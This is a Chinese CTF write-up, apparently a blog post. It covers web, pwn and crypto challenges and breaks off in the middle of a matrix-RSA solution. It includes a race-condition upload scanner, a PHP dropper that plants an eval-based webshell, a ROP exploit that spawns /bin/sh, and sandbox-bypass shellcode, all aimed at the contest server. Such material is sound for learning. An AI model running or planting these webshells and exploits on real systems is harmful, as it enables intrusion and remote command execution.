<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&quot;http://139.155.126.78:22542/admin/Uploads/1f14bba00da3b75118bc8dbf8625f7d0&quot;</span></span><br><span class="line">HEADERS = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">MAX_CONCURRENT_REQUESTS = <span class="number">600</span>  <span class="comment"># 最大并发请求数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">find_php_route</span>(<span class="params">session, base_url</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;异步获取 PHP 文件列表&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> session.get(base_url, headers=HEADERS, timeout=<span class="number">10</span>) <span class="keyword">as</span> response:</span><br><span class="line">            <span class="keyword">if</span> response.status == <span class="number">200</span>:</span><br><span class="line">                html = <span class="keyword">await</span> response.text()</span><br><span class="line">                matches = re.findall(<span class="string">r&#x27;href=&quot;([^&quot;]+\.php)&quot;&#x27;</span>, html)</span><br><span class="line">                <span class="keyword">return</span> matches <span class="keyword">if</span> matches <span class="keyword">else</span> []</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error finding PHP routes: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">check_php_file</span>(<span class="params">session, file_url</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;异步检查 PHP 文件是否可访问&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 确保 URL 是完整的</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> file_url.startswith(<span class="string">&#x27;http&#x27;</span>):</span><br><span class="line">            file_url = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/<span class="subst">&#123;file_url&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> session.get(file_url, headers=HEADERS, timeout=<span class="number">10</span>) <span class="keyword">as</span> response:</span><br><span class="line">            <span class="keyword">if</span> response.status == <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Success! <span class="subst">&#123;file_url&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Failed to access: <span class="subst">&#123;file_url&#125;</span> (status code: <span class="subst">&#123;response.status&#125;</span>)&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error accessing <span class="subst">&#123;file_url&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;主任务：发现并访问 PHP 文件&quot;&quot;&quot;</span></span><br><span class="line">    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT_REQUESTS)  <span class="comment"># 设置并发限制</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession(connector=connector) <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 异步发现 PHP 文件</span></span><br><span class="line">            php_files = <span class="keyword">await</span> find_php_route(session, BASE_URL)</span><br><span class="line">            <span class="keyword">if</span> php_files:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Found PHP routes:&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> php_file <span class="keyword">in</span> php_files:</span><br><span class="line">                    php_url = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/<span class="subst">&#123;php_file&#125;</span>&quot;</span> <span class="keyword">if</span> <span class="keyword">not</span> php_file.startswith(<span class="string">&quot;http&quot;</span>) <span class="keyword">else</span> php_file</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot; - <span class="subst">&#123;php_url&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 异步并发检查所有发现的 PHP 文件</span></span><br><span class="line">                tasks = [check_php_file(session, php_file) <span class="keyword">for</span> php_file <span class="keyword">in</span> php_files]</span><br><span class="line">                results = <span class="keyword">await</span> asyncio.gather(*tasks)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 如果任何一个文件可访问，则停止</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">any</span>(results):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Successfully accessed a PHP file. Exiting.&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    asyncio.run(main())</span><br></pre></td></tr></table></figure>

<p>bp 在进行发包，线程调整到 200，传入内容如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$folder = <span class="string">&quot;Uploads/127.0.0.1/&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!is_dir($folder)) &#123;</span><br><span class="line">    mkdir($folder, 0755, true);</span><br><span class="line">&#125;</span><br><span class="line">$filename = $folder . <span class="string">&quot;111.php&quot;</span>;</span><br><span class="line">$content = <span class="string">&quot;&lt;?php phpinfo();@eval(\$_POST[&#x27;cmd&#x27;]); ?&gt;&quot;</span>;</span><br><span class="line">file_put_contents($filename, $content);</span><br><span class="line">echo <span class="string">&quot;File $filename has been created with webshell content in folder $folder.&quot;</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737186115641-ea4737eb-b1a3-4bc5-9b6d-d8340d277968.png" alt="img" data-caption="img" loading="lazy"></p>
<p>写入的同时访问，最总成功，用蚁剑连接可得 flag</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737186176320-aae535ec-ea29-4f7e-8897-acec0accccdd.png" alt="img" data-caption="img" loading="lazy"></p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737186186070-c96460f7-16e3-485a-9840-ef2d8bdcc448.png" alt="img" data-caption="img" loading="lazy"></p>
<h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><p>rev不出来，这逆向题太有意思了，遗憾退场</p>
<h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="Vpwn"><a href="#Vpwn" class="headerlink" title="Vpwn"></a>Vpwn</h4><p>c++题目</p>
<p>审读代码，有四个功能，push，pop，edit和show</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737197543511-07204c8b-b310-4cb8-ac91-68c837f80d0a.png" alt="img" data-caption="img" loading="lazy"></p>
<p>调试发现，push8次，之后show的话会外带出来libc地址，这里接受转换一下，并计算偏移得到libc地址</p>
<p>之后edit就是本题的关键，这里存在数组溢出，并对我们输入数据进行一个加密，我们需要写加密一下paylaod，之后利用</p>
<p>溢出走system的rop链子，劫持程序流程，getshell</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737197608245-720cd9eb-1ad8-45c7-b3c0-fcf1d6fdf150.png" alt="img" data-caption="img" loading="lazy"></p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737197646763-3879e455-2aa6-4a29-9960-65a7e695a5a5.png" alt="img" data-caption="img" loading="lazy"></p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737197668672-7c62f685-7dd5-4f91-9e39-fc0669e91aba.png" alt="img" data-caption="img" loading="lazy"></p>
<p>成功劫持程序流程，执行我们的payload</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737197696548-18101a84-7370-4058-bac2-51a4713d2a1d.png" alt="img" data-caption="img" loading="lazy"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">	p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">	p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">	p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">	p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">	p.recv(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line">	<span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">	p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line">	<span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line">	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sys</span>():</span><br><span class="line">	<span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line">	<span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)   </span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;139.155.126.78&#x27;,25416)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">i</span>):</span><br><span class="line">	rl(<span class="string">&quot;Enter your choice: &quot;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    rl(<span class="string">&quot;Enter the value to push: &quot;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;666&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">4</span>)</span><br><span class="line">rl(<span class="string">&quot;StackVector contents: &quot;</span>)</span><br><span class="line">data = rl(<span class="string">b&#x27;\n&#x27;</span>).split(<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(data[<span class="number">19</span>]) * (<span class="number">1</span> &lt;&lt; <span class="number">32</span>) + (<span class="built_in">int</span>(data[<span class="number">18</span>]) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">libc_base=libc_addr-<span class="number">0x29d90</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system,bin_sh=get_sys()</span><br><span class="line">rdi = libc_base+libc.search(asm(<span class="string">&quot;pop rdi\nret&quot;</span>)).__next__()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_entry</span>(<span class="params">index, value=<span class="string">b&#x27;1&#x27;</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;edit&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(index), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;value&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(value), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_data</span>(<span class="params">data, part</span>):</span><br><span class="line">    <span class="keyword">if</span> part == <span class="number">0</span>:</span><br><span class="line">        result = data &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = (data &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> result &gt; <span class="number">0x7FFFFFFF</span>:</span><br><span class="line">        result -= <span class="number">2</span>**<span class="number">32</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">update_entry(<span class="number">18</span>,split_data(rdi+<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line">update_entry(<span class="number">19</span>,split_data(rdi+<span class="number">1</span>,<span class="number">1</span>))</span><br><span class="line">update_entry(<span class="number">20</span>,split_data(rdi,<span class="number">0</span>))</span><br><span class="line">update_entry(<span class="number">21</span>,split_data(rdi,<span class="number">1</span>))</span><br><span class="line">update_entry(<span class="number">22</span>,split_data(bin_sh,<span class="number">0</span>))</span><br><span class="line">update_entry(<span class="number">23</span>,split_data(bin_sh,<span class="number">1</span>))</span><br><span class="line">update_entry(<span class="number">24</span>,split_data(system,<span class="number">0</span>))</span><br><span class="line">update_entry(<span class="number">25</span>,split_data(system,<span class="number">1</span>))</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">inter()	</span><br></pre></td></tr></table></figure>

<h4 id="Heaven’s-door"><a href="#Heaven’s-door" class="headerlink" title="Heaven’s door"></a>Heaven’s door</h4><p>查一手保护，开了NX没有PIE</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737196536240-a3f2c217-bf87-4988-b254-6177506ef6c2.png" alt="img" data-caption="img" loading="lazy"></p>
<p>看下源码，明显有沙箱</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737195808042-05956a5f-bafe-49f3-afae-516428fadc24.png" alt="img" data-caption="img" loading="lazy"></p>
<p>直接先运行跑一下看看怎么事儿，有一堆字符串之后有输入</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737197106078-c03f9ef7-5fda-4494-90aa-c31dab504b77.png" alt="img" data-caption="img" loading="lazy"></p>
<p>结合源码，发现让我们读入shellcode，但明显开了沙盒，查一下禁用了什么函数</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737197402309-88bb528c-c7e7-42f8-a9ae-2445113cb38d.png" alt="img" data-caption="img" loading="lazy"></p>
<p>看沙盒的话是只允许使用这几个函数，并且syscall只能用三次，抱着试试的心态，用了openat+sendfile试了试，直接出了，怀疑是题目出的有点问题</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;139.155.126.78&#x27;</span>,<span class="number">30794</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=asm(<span class="string">&#x27;&#x27;&#x27;    </span></span><br><span class="line"><span class="string">    mov rax, 0x67616c662f2e</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    sub rdi, 100</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    xor r10, r10</span></span><br><span class="line"><span class="string">    push SYS_openat</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rsi, 3</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    mov rdx, rsp</span></span><br><span class="line"><span class="string">    mov r10, 0x100</span></span><br><span class="line"><span class="string">    push SYS_sendfile</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;MADE IN HEAVEN !!!!!!!!!!!!!!!!&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="matrixRSA"><a href="#matrixRSA" class="headerlink" title="matrixRSA"></a>matrixRSA</h4><p>题目实现了矩阵上的RSA，给出了p的高位以及加密后的矩阵，第一部分直接对p高位打copper，还原p</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">132298777672085547096511087266255066285502135020124093900452138262993155381766816424955849796168059204379325075568094431259877923353664926875986223020472585645919414821322880213299188157427622804140996898685564075484754918339670099806186873974594139182324884620018780943630196754736972805036038798946726414009</span></span><br><span class="line">p = <span class="number">9707529668721508094878754383636813058761407528950189013789315732447048631740849315894253576415843631107370002912949379757275</span></span><br><span class="line"></span><br><span class="line">p = p&lt;&lt;<span class="number">100</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = p+x</span><br><span class="line">res = f.small_roots(X=<span class="number">2</span>^<span class="number">100</span>, beta=<span class="number">0.4</span>)</span><br><span class="line">p = <span class="built_in">int</span>(res[<span class="number">0</span>]) + p</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">12305755811288164655681709252717258015229295989302934566212712319314835335461946241491177972870130171728224502716603340551354171940107285908105124549960063</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>



<p>到现在的话我们就顺利的分解了n，接下来需要求解私钥，矩阵上的RSA的phi和正常的不太一样，它的形式为</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/f8f07d4c8edd0f6ae936970f3e7f97ec.svg" alt="img" data-caption="img" loading="lazy"></p>
<p>那么接下来求解私钥然后对矩阵整体进行d次幂，然后遍历每行每列输出flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">12305755811288164655681709252717258015229295989302934566212712319314835335461946241491177972870130171728224502716603340551354171940107285908105124549960063</span></span><br><span class="line">n = <span class="number">132298777672085547096511087266255066285502135020124093900452138262993155381766816424955849796168059204379325075568094431259877923353664926875986223020472585645919414821322880213299188157427622804140996898685564075484754918339670099806186873974594139182324884620018780943630196754736972805036038798946726414009</span></span><br><span class="line">C = Matrix(Zmod(n), [</span><br><span class="line">    [<span class="number">130700952989014311434434028098810412089294728270156705618326733322297465714495704072159530618655340096705383710304658044991149662060657745933090473082775425812641300964472543605460360640675949447837208449794830578184968528547366608180085787382376536622136035364815331037493098283462540849880674541138443271941</span>,</span><br><span class="line">     <span class="number">71108771421281691064141020659106224750236412635914570166893031318860027728093402453305986361330527563506168063047627979831630830003190075818824767924892107148560048725155587353683119195901991465464478196049173060097561821877061015587704803006499153902855903286456023726638247758665778434728734461065079337757</span>,</span><br><span class="line">     <span class="number">67999998657112350704927993584783146575182096185020115836188544590466205688442741039622382576899587857972463337900200038021257164640987281308471100297698062626107380871262596623736773815445544153508352926374272336154553916204320257697068627063236060520725376727528604938949588845448940836430120015498687885615</span>],</span><br><span class="line">    [<span class="number">23893343854815011808020457237095285782125931083991537368666368653089096539223297567339111502968295914745423286070638369517207554770793304994639155083818859208362057394004419565231389473766857235749279110546079776040193183912062870294579472815588333047561915280189529367474392709554971446978468118280633281993</span>,</span><br><span class="line">     <span class="number">9711323829269829751519177755915164402658693668631868499383945203627197171508441332211907278473276713066275283973856513580205808517918096017699122954464305556795300874005627001464297760413897074044080665941802588680926430030715299713241442313300920463145903399054123967914968894345491958980945927764454159601</span>,</span><br><span class="line">     <span class="number">44904507975955275578858125671789564568591470104141872573541481508697254621798834910263012676346204850278744732796211742615531019931085695420000582627144871996018850098958417750918177991375489106531511894991744745328626887250694950153424439172667977623425955725695498585224383607063387876414273539268016177401</span>],</span><br><span class="line">    [<span 